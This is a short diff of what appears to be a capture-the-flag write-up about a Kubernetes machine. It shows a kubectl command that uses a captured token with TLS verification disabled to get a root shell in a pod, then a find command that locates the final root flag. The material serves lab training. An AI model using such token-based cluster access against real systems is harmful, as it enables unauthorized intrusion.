@@ -199,9 +199,13 @@ And then run the following command:
   
 `kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://$ip:6443 -n default exec -it host bash`
 
+And with this, we are in as root:
 
+`find / -type f -iname *root.txt* 2>/dev/null`
 
+![image](https://user-images.githubusercontent.com/86648102/134922788-74a8e64e-266a-469a-9054-0f22f2dc7b03.png)
 
+Last flag is here.
 
 
 
